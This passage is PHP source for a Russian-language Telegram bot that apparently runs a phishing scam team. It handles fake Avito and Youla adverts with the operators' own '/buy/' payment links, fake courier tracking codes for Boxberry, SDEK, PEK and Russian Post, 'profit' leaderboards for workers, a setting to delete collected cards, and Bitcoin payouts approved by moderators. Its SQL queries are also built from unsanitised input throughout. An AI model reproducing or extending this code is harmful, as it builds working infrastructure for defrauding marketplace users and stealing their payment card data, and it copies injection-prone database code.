			    }else{
			        $advert_id = mb_substr($callback['type'], 8, -1);
				    send($config['token'], 'sendMessage', Array('chat_id' => $callback['chat_id'], 'text' => getAdvert($callback['from'], $advert_id), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => getAdvert($callback['from'], $advert_id, 1)));
			    }
			}
			
			if(preg_match('/\/hide\/(\d+|[a-z0-9]{24})\//', $callback['type'])) {
				$advert_id = mb_substr($callback['type'], 6, -1);
				mysqli_query($connection, "UPDATE `adverts` SET `status` = '-1' WHERE `advert_id` = '$advert_id'");
				
				send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => getAdvert($callback['from'], $advert_id), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getAdvert($callback['from'], $advert_id, 1)));
			}
			
			if(preg_match('/\/show\/(\d+|[a-z0-9]{24})\//', $callback['type'])) {
				$advert_id = mb_substr($callback['type'], 6, -1);
				mysqli_query($connection, "UPDATE `adverts` SET `status` = '1', `time` = '".time()."' WHERE `advert_id` = '$advert_id'");
				
				send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => getAdvert($callback['from'], $advert_id), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getAdvert($callback['from'], $advert_id, 1)));
				$text = sprintf($callbacks['show']['recovery'], $callback['from'], $callback['firstname'], $callback['lastname']);
				send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				
			}
			
			if(preg_match('/\/trackshow\/\d{6,12}\//', $callback['type'])) {
				$code = mb_substr($callback['type'], 11, -4);
				$platform = mb_substr($callback['type'], -3);
				if($platform == 'BOX'){
					$table = 'trackcodes';
					$type = 0;
				}elseif($platform == 'SDK'){
					$table = 'trackcodessdek';
					$type = 1;
				}elseif ($platform == 'PEK') {
					$table = 'trackcodespek';
					$type = 2;
				}elseif ($platform == 'PST') {
					$table = 'trackcodespost';
					$type = 3;
				}
				$check_user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$callback[from]'"));
				if($check_user['access'] >= 666 AND substr($callback['chat_id'], 0, 1) == '-'){
					$search = mysqli_query($connection, "SELECT `id` FROM `$table` WHERE `code` = '$code' AND `status` = '-1'");
					$chat_id = $config['chat']['moders'];
				}else{
					$search = mysqli_query($connection, "SELECT `id` FROM `$table` WHERE `code` = '$code' AND `status` = '-1'");
					$chat_id = $callback['from'];
				}
				
				
				if(mysqli_num_rows($search) > 0) {
					mysqli_query($connection, "UPDATE `$table` SET `status` = '1', `time` = '".time()."' WHERE `code` = '$code' AND `status` = '-1'");
					
					send($config['token'], 'editMessageText', Array('chat_id' => $chat_id, 'message_id' => $callback['message_id'], 'text' => getTrack($callback['from'], $code, 0, $type), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getTrack($callback['from'], $code, 1, $type)));
					$text = sprintf($callbacks['track']['recovery'], $status, $callback['from'], $callback['firstname'], $callback['lastname'], $code);
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				} else {
					$text = $callbacks['track']['not_exists'];
					send($config['token'], 'sendMessage', Array('chat_id' => $chat_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				}
			}
			
			if(preg_match('/\/trackwait\/\d{6,12}\//', $callback['type'])) {
				$code = mb_substr($callback['type'], 11, -4);
				$platform = mb_substr($callback['type'], -3);
				if($platform == 'BOX'){
					$table = 'trackcodes';
					$type = 0;
				}elseif($platform == 'SDK'){
					$table = 'trackcodessdek';
					$type = 1;
				}elseif ($platform == 'PEK') {
					$table = 'trackcodespek';
					$type = 2;
				}elseif ($platform == 'PST') {
					$table = 'trackcodespost';
					$type = 3;
				}
				$check_user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$callback[from]'"));
				if($check_user['access'] >= 666 AND substr($callback['chat_id'], 0, 1) == '-'){
					$search = mysqli_query($connection, "SELECT `id` FROM `$table` WHERE `code` = '$code' AND `status` > '0'");
					$chat_id = $config['chat']['moders'];
					$status = 'Модератор';
				}else{
					$search = mysqli_query($connection, "SELECT `id` FROM `$table` WHERE `code` = '$code' AND `status` > '0'");
					$chat_id = $callback['from'];
				}
				
				if(mysqli_num_rows($search) > 0) {
					mysqli_query($connection, "UPDATE `$table` SET `status` = '1' WHERE `code` = '$code' AND `status` > '0'");
					
					send($config['token'], 'editMessageText', Array('chat_id' => $chat_id, 'message_id' => $callback['message_id'], 'text' => getTrack($callback['from'], $code, 0, $type), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getTrack($callback['from'], $code, 1, $type)));
					$text = sprintf($callbacks['track']['change_status'], $status, $callback['from'], $callback['firstname'], $callback['lastname'], $code, $functions['getTrack']['status']["1"]);
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				} else {
					$text = $callbacks['track']['not_exists'];
					send($config['token'], 'sendMessage', Array('chat_id' => $chat_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				}
			}
			
			if(preg_match('/\/trackpay\/\d{6,12}\//', $callback['type'])) {
				$code = mb_substr($callback['type'], 10, -4);
				$platform = mb_substr($callback['type'], -3);
				if($platform == 'BOX'){
					$table = 'trackcodes';
					$type = 0;
				}elseif($platform == 'SDK'){
					$table = 'trackcodessdek';
					$type = 1;
				}elseif ($platform == 'PEK') {
					$table = 'trackcodespek';
					$type = 2;
				}elseif ($platform == 'PST') {
					$table = 'trackcodespost';
					$type = 3;
				}
				$check_user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$callback[from]'"));
				if($check_user['access'] >= 666 AND substr($callback['chat_id'], 0, 1) == '-'){
					$search = mysqli_query($connection, "SELECT `id` FROM `$table` WHERE `code` = '$code' AND `status` > '0'");
					$chat_id = $config['chat']['moders'];
					$status = 'Модератор';
				}else{
					$search = mysqli_query($connection, "SELECT `id` FROM `$table` WHERE `code` = '$code' AND `status` > '0'");
					$chat_id = $callback['from'];
				}
				
				
				if(mysqli_num_rows($search) > 0) {
					mysqli_query($connection, "UPDATE `$table` SET `status` = '2' WHERE `code` = '$code' AND `status` > '0'");
					
					send($config['token'], 'editMessageText', Array('chat_id' => $chat_id, 'message_id' => $callback['message_id'], 'text' => getTrack($callback['from'], $code, 0, $type), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getTrack($callback['from'], $code, 1, $type)));
					$text = sprintf($callbacks['track']['change_status'], $status, $callback['from'], $callback['firstname'], $callback['lastname'], $code, $functions['getTrack']['status']["2"]);
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				} else {
					$text = $callbacks['track']['not_exists'];
					send($config['token'], 'sendMessage', Array('chat_id' => $chat_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				}
			}
			
			if(preg_match('/\/trackref\/\d{6,12}\//', $callback['type'])) {
				$code = mb_substr($callback['type'], 10, -4);
				$platform = mb_substr($callback['type'], -3);
				if($platform == 'BOX'){
					$table = 'trackcodes';
					$type = 0;
				}elseif($platform == 'SDK'){
					$table = 'trackcodessdek';
					$type = 1;
				}elseif ($platform == 'PEK') {
					$table = 'trackcodespek';
					$type = 2;
				}elseif ($platform == 'PST') {
					$table = 'trackcodespost';
					$type = 3;
				}
				$check_user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$callback[from]'"));
				if($check_user['access'] >= 666 AND substr($callback['chat_id'], 0, 1) == '-'){
					$search = mysqli_query($connection, "SELECT `id` FROM `$table` WHERE `code` = '$code' AND `status` > '0'");
					$chat_id = $config['chat']['moders'];
					$status = 'Модератор';
				}else{
					$search = mysqli_query($connection, "SELECT `id` FROM `$table` WHERE `code` = '$code' AND `status` > '0'");
					$chat_id = $callback['from'];
				}
				
				if(mysqli_num_rows($search) > 0) {
					mysqli_query($connection, "UPDATE `$table` SET `status` = '3' WHERE `code` = '$code' AND `status` > '0'");
					
					send($config['token'], 'editMessageText', Array('chat_id' => $chat_id, 'message_id' => $callback['message_id'], 'text' => getTrack($callback['from'], $code, 0, $type), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getTrack($callback['from'], $code, 1, $type)));
					$text = sprintf($callbacks['track']['change_status'], $status, $callback['from'], $callback['firstname'], $callback['lastname'], $code, $functions['getTrack']['status']["3"]);
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				} else {
					$text = $callbacks['track']['not_exists'];
					send($config['token'], 'sendMessage', Array('chat_id' => $chat_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				}
			}
			
			if(preg_match('/\/trackhide\/\d{6,12}\//', $callback['type']) == TRUE) {
				$code = mb_substr($callback['type'], 11, -4);
				$platform = mb_substr($callback['type'], -3);
				if($platform == 'BOX'){
					$table = 'trackcodes';
					$type = 0;
				}elseif($platform == 'SDK'){
					$table = 'trackcodessdek';
					$type = 1;
				}elseif ($platform == 'PEK') {
					$table = 'trackcodespek';
					$type = 2;
				}elseif ($platform == 'PST') {
					$table = 'trackcodespost';
					$type = 3;
				}
				$check_user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$callback[from]'"));
				if($check_user['access'] >= 666 AND substr($callback['chat_id'], 0, 1) == '-'){
					$search = mysqli_query($connection, "SELECT `id` FROM `$table` WHERE `code` = '$code' AND `status` > '0'");
					$chat_id = $config['chat']['moders'];
					$status = 'Модератор';
				}else{
					$search = mysqli_query($connection, "SELECT `id` FROM `$table` WHERE `code` = '$code' AND `status` > '0'");
					$chat_id = $callback['from'];
				}
				
				if(mysqli_num_rows($search) > 0) {
					mysqli_query($connection, "UPDATE `$table` SET `status` = '-1' WHERE `code` = '$code' AND `status` > '0'");
					
					send($config['token'], 'editMessageText', Array('chat_id' => $chat_id, 'message_id' => $callback['message_id'], 'text' => getTrack($callback['from'], $code, 0, $type), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getTrack($callback['from'], $code, 1, $type)));
					$text = sprintf($callbacks['track']['hide'], $status, $callback['from'], $callback['firstname'], $callback['lastname'], $code);
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				} else {
					$text = $callbacks['track']['not_exists'];
					send($config['token'], 'sendMessage', Array('chat_id' => $chat_id, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				}
			}

			if(preg_match('/\/restrack\/\d{6,12}\//', $callback['type']) == TRUE) {
				$code = mb_substr($callback['type'], 10, -4);
				$platform = mb_substr($callback['type'], -3);
				if($platform == 'BOX'){
					$table = 'trackcodes';
					$type = 0;
				}elseif($platform == 'SDK'){
					$table = 'trackcodessdek';
					$type = 1;
				}elseif ($platform == 'PEK') {
					$table = 'trackcodespek';
					$type = 2;
				}elseif ($platform == 'PST') {
					$table = 'trackcodespost';
					$type = 3;
				}

				$check_user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `access` FROM `accounts` WHERE `telegram` = '$callback[from]'"));
				if($check_user['access'] >= 666 AND substr($callback['chat_id'], 0, 1) == '-'){
					$search = mysqli_query($connection, "SELECT `id` FROM `$table` WHERE `code` = '$code' AND `status` > '0'");
					$chat_id = $config['chat']['moders'];
					$status = 'Модератор';
				}else{
					$search = mysqli_query($connection, "SELECT `id` FROM `$table` WHERE `code` = '$code' AND `status` > '0'");
					$chat_id = $callback['from'];
				}

				mysqli_query($connection, "UPDATE `$table` SET `status` = '1', `time` = '".time()."' WHERE `code` = '$code' AND `status` = '1'");

				send($config['token'], 'sendMessage', Array('chat_id' => $chat_id, 'text' => showTrack($callback['from'], $code, 0, $type), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
				$text = sprintf($callbacks['track']['recovery'], $status, $callback['from'], $callback['firstname'], $callback['lastname'], $code);
				send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			}

			if(preg_match('/\/showCommands\//', $callback['type'])) {
				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => showCommands(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => showCommands(1)));
			}
			
			if(preg_match('/\/showforums\//', $callback['type'])) {
				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => showForums(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => showForums(1)));
			}
			
			if(preg_match('/\/showrules\//', $callback['type'])) {
				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => showRules(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
			}
			
			if(preg_match('/\/showSupport\//', $callback['type'])) {
				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => showSupport(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
			}
			
			if(preg_match('/\/showPayinfo\//', $callback['type'])) {
				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => showPayinfo(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
			}

			if(preg_match('/\/topworkers\//', $callback['type'])) {
				$tops = mysqli_query($connection, "SELECT `worker`, SUM(`amount`) AS total from payments WHERE `status` = '1' group by `worker` order by total DESC LIMIT 10");
				$i = 0;
				$text = $callbacks['top']['header'];
				while( $row = mysqli_fetch_assoc($tops) ){
					$i++;
			        $user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `user_tag`,`telegram` FROM `accounts` WHERE `telegram` = '$row[worker]'"));
			        $profit =  mysqli_fetch_assoc(mysqli_query($connection, "SELECT COUNT(`id`) AS count FROM `payments` WHERE `worker` = '$row[worker]' AND `status` = '1'"));
			        $text .= sprintf($callbacks['top']['item'], $i, $user['user_tag'], $row['total'], Endings($profit['count'], "профит", "профита", "профитов"));
			    }
			    send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			}

			if(preg_match('/\/changebtc\//', $callback['type'])) {
				mysqli_query($connection, "UPDATE `accounts` SET `wallet` = '-2' WHERE `telegram` = '$callback[from]'");
				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $callbacks['change_btc']['header'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
			}
			
			if(preg_match('/\/payment\//', $callback['type'])) {
				$payment = mb_substr($callback['type'], 9);
				if($config['payment'] != $payment){
					mysqli_query($connection, "UPDATE `config` SET `payment` = '$payment'");
					$text = sprintf($callbacks['payment']['changed'], $payments_array[$payment]);
				}else{
					$text = $callbacks['payment']['not_changed'];
				}
				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			}
			
			if(preg_match('/\/delcards\//', $callback['type'])) {
				$del = mb_substr($callback['type'], 10);
				$state = $del == 1 ? $callbacks['delcard']['delete'] : $callbacks['delcard']['not_delete'];
				if($config['delcard'] != $del){
					mysqli_query($connection, "UPDATE `config` SET `delcard` = '$del'");
					$text = sprintf($callbacks['delcard']['change_status'], $state);
				}else{
					$text = $callbacks['delcard']['not_changed'];
				}
				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			}
			
			if(preg_match('/\/payout\//', $callback['type'])) {
				if(preg_match('/\/payout\/approve\/\d{0,20}/', $callback['type'])){
					$isAccess = mysqli_query($connection, "SELECT `id`, `access` FROM `accounts` WHERE `telegram` = '$callback[from]' AND `access` >= '100'");
					if(mysqli_num_rows($isAccess) > 0) {
						$access = mysqli_fetch_assoc($isAccess);
						if($access['access'] >= 100) $rank = 'Помощник';
						if($access['access'] >= 500) $rank = 'Модератор';
						$id = substr($callback['type'], 16);
						$payout = mysqli_query($connection, "SELECT `worker`,`amount`,`time`,`status` FROM `payouts` WHERE `id` = '$id'");
						if(mysqli_num_rows($payout) > 0){
							$payout = mysqli_fetch_assoc($payout);
							if($payout['status'] == '0'){
								mysqli_query($connection, "UPDATE `accounts` SET `balance` = `balance` - $payout[amount] WHERE `telegram` = '$payout[worker]'");
								mysqli_query($connection, "UPDATE `payouts` SET `status` = '1' WHERE `id` = '$id'");
								send($config['token'], 'sendMessage', Array('chat_id' => $payout['worker'], 'text' => $callbacks['payouts']['status']['success_pay'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								$user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT * FROM `accounts` WHERE `telegram` = '$payout[worker]'"));
								$text = str_replace("\t", "",sprintf($callbacks['payouts']['header'], $user['telegram'], $user['telegram'], $payout['amount'], $user['wallet'], date('d.m.Y H:i:s', $payout['time'])));
								$text .= sprintf($callbacks['payouts']['status']['approve'], $rank, $callback['from'], $callback['firstname'], $callback['lastname']);
								send($config['token'], 'editMessageText', Array('chat_id' => $config['chat']['payouts'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => ''));
							}else{
								$text = str_replace("\t", "",sprintf($callbacks['payouts']['header'], $user['telegram'], $user['telegram'], $payout['amount'], $user['wallet'], date('d.m.Y H:i:s', $payout['time'])));
								$text .= $callbacks['payouts']['status']['not_exists'];
								send($config['token'], 'editMessageText', Array('chat_id' => $config['chat']['payouts'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
							}
						}else{
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['payouts'], 'text' => $callbacks['payouts']['status']['not_exists'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
				}elseif(preg_match('/\/payout\/decline\/\d{0,20}/', $callback['type'])){
					$isAccess = mysqli_query($connection, "SELECT `id`, `access` FROM `accounts` WHERE `telegram` = '$callback[from]' AND `access` >= '100'");
					if(mysqli_num_rows($isAccess) > 0) {
						$access = mysqli_fetch_assoc($isAccess);
						if($access['access'] >= 100) $rank = 'Помощник';
						if($access['access'] >= 500) $rank = 'Модератор';
						$id = substr($callback['type'], 16);
						$payout = mysqli_query($connection, "SELECT `worker`,`amount`,`time`,`status` FROM `payouts` WHERE `id` = '$id'");
						if(mysqli_num_rows($payout) > 0){
							$payout = mysqli_fetch_assoc($payout);
							if($payout['status'] == '0'){
								mysqli_query($connection, "UPDATE `payouts` SET `status` = '2' WHERE `id` = '$id'");
								send($config['token'], 'sendMessage', Array('chat_id' => $payout['worker'], 'text' => $callbacks['payouts']['status']['fail'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								$user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT * FROM `accounts` WHERE `telegram` = '$payout[worker]'"));
								$text = str_replace("\t", "",sprintf($callbacks['payouts']['header'], $user['telegram'], $user['telegram'], $payout['amount'], $user['wallet'], date('d.m.Y H:i:s', $payout['time'])));
								$text .= sprintf($callbacks['payouts']['status']['reject'], $rank, $callback['from'], $callback['firstname'], $callback['lastname']);
								send($config['token'], 'editMessageText', Array('chat_id' => $config['chat']['payouts'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => ''));
							}else{
								$text = str_replace("\t", "",sprintf($callbacks['payouts']['header'], $user['telegram'], $user['telegram'], $payout['amount'], $user['wallet'], date('d.m.Y H:i:s', $payout['time'])));
								$text .= $callbacks['payouts']['status']['not_exists'];
								send($config['token'], 'editMessageText', Array('chat_id' => $config['chat']['payouts'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
							}
						}else{
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['payouts'], 'text' => $callbacks['payouts']['status']['not_exists'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
				}elseif(preg_match('/\/payout\/banned\/\d{0,20}/', $callback['type'])){
					$isAccess = mysqli_query($connection, "SELECT `id`, `access` FROM `accounts` WHERE `telegram` = '$callback[from]' AND `access` >= '100'");
					if(mysqli_num_rows($isAccess) > 0) {
						$access = mysqli_fetch_assoc($isAccess);
						if($access['access'] >= 100) $rank = 'Помощник';
						if($access['access'] >= 500) $rank = 'Модератор';
						$id = substr($callback['type'], 15);
						$payout = mysqli_query($connection, "SELECT `worker`,`amount`,`time`,`status` FROM `payouts` WHERE `id` = '$id'");
						if(mysqli_num_rows($payout) > 0){
							$payout = mysqli_fetch_assoc($payout);
							if($payout['status'] == '0'){
								mysqli_query($connection, "UPDATE `payouts` SET `status` = '3' WHERE `id` = '$id'");
								send($config['token'], 'sendMessage', Array('chat_id' => $payout['worker'], 'text' => $callbacks['payouts']['status']['fail_banned'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								$user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT * FROM `accounts` WHERE `telegram` = '$payout[worker]'"));
								mysqli_query($connection, "UPDATE `accounts` SET `balance` = `balance` - $payout[amount] WHERE `telegram` = $payout[worker]");
								$text = str_replace("\t", "",sprintf($callbacks['payouts']['header'], $user['telegram'], $user['telegram'], $payout['amount'], $user['wallet'], date('d.m.Y H:i:s', $payout['time'])));
								$text .= sprintf($callbacks['payouts']['status']['banned'], $rank, $callback['from'], $callback['firstname'], $callback['lastname']);
								send($config['token'], 'editMessageText', Array('chat_id' => $config['chat']['payouts'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => ''));
							}else{
								$text = str_replace("\t", "",sprintf($callbacks['payouts']['header'], $user['telegram'], $user['telegram'], $payout['amount'], $user['wallet'], date('d.m.Y H:i:s', $payout['time'])));
								$text .= $callbacks['payouts']['status']['not_exists'];
								send($config['token'], 'editMessageText', Array('chat_id' => $config['chat']['payouts'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
							}
						}else{
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['payouts'], 'text' => $callbacks['payouts']['status']['not_exists'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}
				}elseif(preg_match('/\/payout\/cancel\//', $callback['type'])){
					$payout = mysqli_query($connection, "SELECT * FROM `payouts` WHERE `worker` = '$callback[from]' ORDER by `id` DESC LIMIT 1");
					if(mysqli_num_rows($payout) > 0){
						$payout = mysqli_fetch_assoc($payout);
						mysqli_query($connection, "UPDATE `payouts` SET `status` = '-1' WHERE `id` = '$payout[id]'");

						$statuses = [
							'-1'=> "Отменена пользователем",
							'0'	=> "Обработка",
							'1'	=> "Выплачено!",
							'2' => "Отменена",
							'3' => "Кошелек был заблокирован"
						];
						$text = sprintf("<b>Сумма заявки:</b> <code>%s руб</code>\n<b>Статус заявки:</b> <code>%s</code>\n<b>Дата создания заявки:</b> <code>%s</code>\n", $payout['amount'], $statuses['-1'], date('d.m.Y H:i:s', $payout['time']));
						$text .= "<b>Заявка успешно отменена!</b>";
						send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));

						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => "<a href=\"tg://user?id=$payout[worker]\">Воркер</a> отменил заявку на вывод №$payout[id]", 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}
				}else{
					$user = mysqli_fetch_assoc(mysqli_query($connection, "SELECT * FROM `accounts` WHERE `telegram` = '$callback[from]'"));
					$check_payout = mysqli_query($connection, "SELECT * FROM `payouts` WHERE `worker` = '$callback[from]' AND `status` = '0' ORDER by `id` DESC LIMIT 1");
					if($user['wallet'] != '-1' AND $user['wallet'] != '-2' AND strlen($user['wallet']) > 5){
						if(mysqli_num_rows($check_payout) == 0){
							if($user['balance'] > 1000){
								$date = time();
								mysqli_query($connection, "INSERT INTO `payouts`(`worker`, `amount`, `status`, `time`) VALUES ('$user[telegram]','$user[balance]','0','$date')");
								send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => sprintf($callbacks['payouts']['status']['success'], $user['balance']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
								$id = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `id` FROM `payouts` ORDER by `id` DESC LIMIT 1"));
								$text = str_replace("\t", "",sprintf($callbacks['payouts']['header'], $user['telegram'], $user['telegram'], $user['balance'], $user['wallet'], date('d.m.Y H:i:s', $payout['time'])));
								$urls = [
									'approve' => "/payout/approve/$id[id]",
									'decline' => "/payout/decline/$id[id]",
									'banned' => "/payout/banned/$id[id]",
								];
								$keyboard = Array('inline_keyboard' => Array(
									Array(
										Array('text' => $callbacks['payouts']['keyboard']['approve'], 'callback_data' => $urls['approve'])
									),
									Array(
										Array('text' => $callbacks['payouts']['keyboard']['reject'], 'callback_data' => $urls['decline'])
									),
									Array(
										Array('text' => $callbacks['payouts']['keyboard']['banned'], 'callback_data' => $urls['banned'])
									)
								));
								send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['payouts'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'reply_markup' => json_encode($keyboard)));
							}else{
								send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $callbacks['payouts']['status']['balance'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							}
						}else{
							send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $callbacks['payouts']['status']['waiting'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						}
					}else{
						send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $callbacks['payouts']['status']['not_btc'], 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
					}
				}
			}

			if(preg_match('/\/getadverts\//', $callback['type'])){
				$user_id = mb_substr($callback['type'], 12, -4);
				$type = mb_substr($callback['type'], -3);
				$text = $functions['getMyAdverts']['header'];
				$keyboard = Array('inline_keyboard' => Array(Array()));
				switch ($type) {
					case 'AVT':
						$adverts = mysqli_query($connection, "SELECT `type`, `advert_id`, `title`, `price`, `delivery`, `views` FROM `adverts` WHERE `worker` = '$user_id' AND `status` = '1' AND `type` = '0'");
						$x = 0;
						if(mysqli_num_rows($adverts) > 0) {
							while($row = mysqli_fetch_assoc($adverts)) {
								$x = $x+1;
									
								if($row['delivery'] == 0) {
									global $settings;
									$row['delivery'] = $settings['delivery'];
								}
								
								if($row['type'] == 0) $url = 'https://avito.ru/'.$row['advert_id'] AND $payment = $links['avito'].'/buy/'.$row['advert_id'];

								$text .= str_replace("\t", "", sprintf($functions['getMyAdverts']['advert'],
									$x,
									$row['title'],
									$row['price'],
									$row['delivery'],
									$payment
								));
								array_push($keyboard['inline_keyboard'], Array(Array('text' => sprintf($functions['getMyAdverts']['keyboard'], $x, $row['title'], $row['price']), 'callback_data' => '/advert/'.$row['advert_id'].'/')));
							}
						}else{
							$text = $functions['getMyAdverts']['errors']['null_adverts_user'];
						}
					break;

					case 'YOU':
						$adverts = mysqli_query($connection, "SELECT `type`, `advert_id`, `title`, `price`, `delivery`, `views` FROM `adverts` WHERE `worker` = '$user_id' AND `status` = '1' AND `type` = '1'");
						$x = 0;
						if(mysqli_num_rows($adverts) > 0) {
							while($row = mysqli_fetch_assoc($adverts)) {
								$x = $x+1;
									
								if($row['delivery'] == 0) {
									global $settings;
									$row['delivery'] = $settings['delivery'];
								}
								
								if($row['type'] == 1) $url = 'https://youla.ru/'.$row['advert_id'] AND $payment = $links['youla'].'/buy/'.$row['advert_id'];

								$text .= str_replace("\t", "", sprintf($functions['getMyAdverts']['advert'],
									$x,
									$row['title'],
									$row['price'],
									$row['delivery'],
									$payment
								));
								array_push($keyboard['inline_keyboard'], Array(Array('text' => sprintf($functions['getMyAdverts']['keyboard'], $x, $row['title'], $row['price']), 'callback_data' => '/advert/'.$row['advert_id'].'/')));
							}
						}else{
							$text = $functions['getMyAdverts']['errors']['null_adverts_user'];
						}
					break;

					case 'BOX':
						$x = 0;
						$trackcodes = mysqli_query($connection, "SELECT * FROM `trackcodes` WHERE `worker` = '$user_id' AND `status` > '0'");
				
						if(mysqli_num_rows($trackcodes) > 0) {
							while($row = mysqli_fetch_assoc($trackcodes)) {
								$x = $x+1;
								
								$link = $links['boxberry'].'/track/'.$row['code'];
								$text .= str_replace("\t", "", sprintf($functions['getMyAdverts']['trackcode'],
									$x,
									$link,
									$row['product'],
									$row['amount'],
									"Boxberry"
								));
								array_push($keyboard['inline_keyboard'], Array(Array('text' => sprintf($functions['getMyAdverts']['keyboard'], $x, $row['product'], $row['amount']), 'callback_data' => '/trackcode/'.$row['code'].'/BOX')));
